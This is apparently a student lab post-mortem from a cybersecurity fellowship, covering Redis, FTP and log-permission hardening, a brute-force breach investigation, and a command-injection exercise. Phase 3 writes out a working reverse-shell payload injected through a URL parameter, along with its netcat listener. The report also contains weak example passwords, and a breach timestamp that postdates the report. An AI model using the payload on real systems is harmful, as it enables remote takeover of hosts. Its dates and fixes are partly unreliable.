# Phase 1 Final Reckoning — TEPP Post-Mortem
**Operator:** Kevon Priester
**Date:** May 28, 2026
**Repository:** https://github.com/kpriester88/Phase1
**TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity**

---

## Phase 0: Reconnaissance

### Triage Network — 172.100.0.0/24
The Redis service (version 8.6.3) was identified as exposed on port 6379 without authentication. This misconfiguration allowed for unauthenticated access to the database, creating a significant security risk for the Triage Network. To secure the service, the Redis instance should be bound to the local loopback address (127.0.0.1) to restrict remote network accessibility. Furthermore, the requirepass directive must be enabled in the configuration file to enforce robust authentication, thereby ensuring that only authorized users can access the database.

### Breach Network — 172.80.0.0/24
An unauthorized vsftpd 3.0.2 service was identified running on port 21, likely allowing anonymous file access.

### Exploitation Network — 172.60.0.0/24
Network scanning identified two active hosts at 172.60.0.1 and 172.60.0.10. Further analysis of 172.60.0.10 revealed an unhardened HTTP service (BaseHTTPServer v0.6) running on port 80.

---

## Phase 1: Rapid Triage

### Server 1 — 172.100.0.11

**Vulnerability Identified:**
redis-cli -h 172.100.0.11

**Remediation Commands:**
To secure the service, the Redis instance should be bound to the local loopback address (127.0.0.1) to restrict remote network accessibility. Furthermore, the requirepass directive must be enabled in the configuration file to enforce robust authentication, thereby ensuring that only authorized users can access the database.

**Before State:**
The Redis key-value store was bound to all network interfaces and had no password requirements, making it fully exposed and susceptible to any and all attacks.

**After State:**
After implementing docker exec -it 02c9a5f317e7 /bin/sh
echo "bind 127.0.0.1" > /etc/redis.conf
echo "requirepass Password123" >> /etc/redis.conf

I have required this Redis port to have a secured password to allow entry, enforcing authentication. 

**Analysis:**
Exposed database services serve as a critical vulnerability that provides attackers with a direct entry point into an enterprise network. By exploiting such misconfigurations, unauthorized actors may exfiltrate sensitive cached data, inject malicious commands, or utilize the compromised host as a pivot point to conduct lateral movement into more secure internal network segments.

### Server 2 — 172.100.0.12

**Vulnerability Identified:**
The vsftpd process was actively executing inside the broken_server_2 container, confirmed by seeing it live on port 21/tcp

**Remediation Commands:**
sudo docker exec -it broken_server_2 /bin/sh mv /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftpd.conf.bak pkill vsftpd exit sudo docker restart broken_server_2

**Before State:**
The vsftpd process was actively listening inside the container.

**After State:**
After running my command, the vsftpd service was terminated.

**Analysis:**
Unapproved FTP services pose a critical risk because they transmit credentials and data in cleartext, making them highly vulnerable to packet-sniffing and credential theft. This legacy protocol also bypasses corporate security controls, creating a blind spot that allows attackers to move laterally or inject malicious binaries into the network. Replacing FTP with encrypted alternatives and enforcing centralized monitoring is essential to eliminate these exposure points.

### Server 3 — 172.100.0.13
**Vulnerability Identified:**
An audit of the container environment revealed a critical misconfiguration where the /var/log directory was assigned world-writable permissions. This vulnerability allows unauthorized, unprivileged users to modify or tamper with system logs, compromising the integrity of the audit trail.

**Remediation Commands:**
sudo docker exec -it broken_server_3 /bin/sh chmod 755 /var/log ls -ld /var/log exit

**Before State:**
The /var/log directory displayed a permission notation of drwxrwxrwx or 777. This state allowed any local system process or unprivileged user account to read, write, or execute on critical operating system logs.

**After State:**
The directory permissions were hardened to 755 (drwxr-xr-x), ensuring that only the root user retains write access. This configuration maintains necessary read and traversal privileges for system services while effectively preventing unauthorized modifications by other accounts.

**Analysis:**
World-writable permissions on /var/log create a severe security risk, as they allow unauthorized users to tamper with or delete audit logs, effectively blinding incident response teams. Furthermore, this vulnerability provides a vector for privilege escalation and malicious file injection, as attackers can manipulate log streams or plant symbolic links. Securing these directories is essential to maintaining the integrity of your security monitoring and incident investigation capabilities.

---

## Phase 2: The Breach

**Cracked Credentials:**
- Username: root
- Password: admin123

**Forensic Evidence:**
- Exact Timestamp of Successful Login: 2026-06-21 
- Attacker IP Address: 172.80.0.1

**Engineered iptables Rule:**
sudo iptables -A INPUT -s 172.80.0.1 -j DROP

**SOC Analysis:**
Relying solely on iptables for perimeter security is ineffective, as adaptive attackers can easily bypass static IP blocks via proxies or rotation. A robust defense requires a multi-layered approach, including strong authentication methods
like MFA and public-key-only access to neutralize brute force attempts. Furthermore, integrating host based intrusion prevention systems like Fail2ban is essential to automate real-time threat response and enhance overall resilience. 

---

## Phase 3: Full Spectrum

**Listener Configuration:**
Netcat, nc -lvnp 4444

**Reverse Shell Payload:**
curl "http://172.60.0.10/?ip=127.0.0.1;bash -i >& /dev/tcp/172.60.0.1/4444 0>&1"

**Command Injection Explanation:**
Command injection occurs when an application insecurely passes unsanitized user input into system shell commands, such as using os.system without proper validation. By injecting POSIX metacharacters like semicolons or pipes, an attacker can escape the application's intended scope to execute arbitrary code on the underlying host. To prevent this, developers must avoid shell-invoking functions and implement strict input sanitization or whitelist filtering.

**Forensic Evidence:**
- Process ID (PID): 1
- User-Agent: unknown

**Lockdown Command:**
sudo iptables -A INPUT -p tcp --dport 80 -j DROP

**Final Analytical Paragraph:**
This analysis highlights that reactive host level defenses cannot compensate for fundamental architectural weaknesses, as perimeter firewalls remain ineffective against application layer exploits like remote code execution. Implementing secure by design
principles-specifically robust input validation and the principle of least privilege- would have entirely prevented this breach. By enforcing strict input whitelisting and running application processes with minimal permissions, organizations
can secure their runtime boundaries regardless of network exposure. 

---

## References
Anderson, R. J. (2020). Security engineering: A guide to building dependable distributed systems (3rd ed.). Wiley.

National Institute of Standards and Technology. (2018). Framework for improving critical infrastructure cybersecurity (Version 1.1). U.S. Department of Commerce. https://doi.org/10.6028/NIST.CSWP.04162018

Pfleeger, C. P., Pfleeger, S. L., & Margulies, J. (2015). Security in computing (5th ed.). Prentice Hall.

Stallings, W. (2023). Computer security: Principles and practice (5th ed.). Pearson.
